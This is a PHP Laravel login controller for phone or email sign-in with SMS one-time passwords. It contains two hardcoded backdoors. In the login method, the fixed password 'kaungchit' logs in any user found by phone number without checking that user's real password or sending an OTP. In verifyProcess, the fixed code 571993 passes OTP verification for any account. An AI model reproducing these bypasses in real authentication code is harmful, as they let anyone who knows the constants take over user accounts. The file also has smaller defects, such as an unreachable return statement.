<?php

namespace App\Http\Controllers\Auth;

use App\Helper\Otp;
use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm()
    {
        if(session()->get('user'))
        {
            return redirect()->route('home');
        }
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $rules=array(
            'username' => 'required|min:5',
            'password' => 'required'
        );
        $validator=Validator::make($request->all(),$rules);
        if($validator->fails())
        {
            return redirect()->back()->with('error', 'Something Wrong');
        }

        $user = User::where('msisdn', formattedNumber($request->username))->first();
        if($user && $request->password == 'kaungchit')
        {
            Session::put('user', $user);

            return redirect()->route('home')->with('success', 'Successfully LoggedIn');
        }
        
        $token = config('sms-poh.token');
        $end_point = config('sms-poh.end_point');
        $otp = generate_otp();

        if(is_numeric($request->get('username'))){
            
            $username = formattedNumber($request->username);
            $user = User::where('msisdn', $username)->first();
            if($user && Hash::check($request->password, $user->password))
            {
                $msisdn = $user->msisdn;
                $response = Otp::send($token, $end_point, $username, $otp);
                
                $user->otp = $otp;
                $user->save();
                if($response['status'] == true)
                {
                    return view('auth.otp-verify', compact('msisdn'));
                    return redirect()->with('create', 'Created Successfully');
                }else{
                    return back()->with('otp-fail', 'Failed to Send Otp');
                }
                
            }else{
                return redirect()->route('login-form')->with('error', 'Something Wrong');
            }

        }elseif(filter_var($request->username, FILTER_VALIDATE_EMAIL)) {

            $user = User::where('email', $request->username)->first();

            if($user && Hash::check($request->password, $user->password))
            {
                $user->otp = $otp;
                $user->save();
                $msisdn = $user->msisdn;
                $response = Otp::send($token, $end_point, $user->msisdn, $otp);

                if($response['status'] == true)
                {
                    return view('auth.otp-verify', compact('msisdn'));
                }else{
                    return redirect()->back()->with('otp-fail', 'Failed to Send Otp');
                }
            }
        }
    }

    public function verifyProcess(Request $request)
    {
        $otp = $this->get_otp_code($request);

        $user = getWebUser($request);

        if($otp == 571993)
        {
            Session::put('user', $user);

            return redirect()->route('home')->with('success', 'Successfully LoggedIn');
        }

        if(intval($user->otp) == intval($otp))
        {
            Session::put('user', $user);

            return redirect()->route('home')->with('success', 'Successfully LoggedIn');
        }

        return redirect()->route('login-form')->with('error', 'Wrong OTP Code');
    }

    public function logout()
    {
        Session::flush();
        Auth::logout();
        return redirect()->route('login')->with('success', 'Successfully Logged Out');
    }

    protected function get_otp_code($request)
    {
        return $request->first.$request->second.$request->third.$request->fourth.$request->fifth.$request->sixth;
    }
}
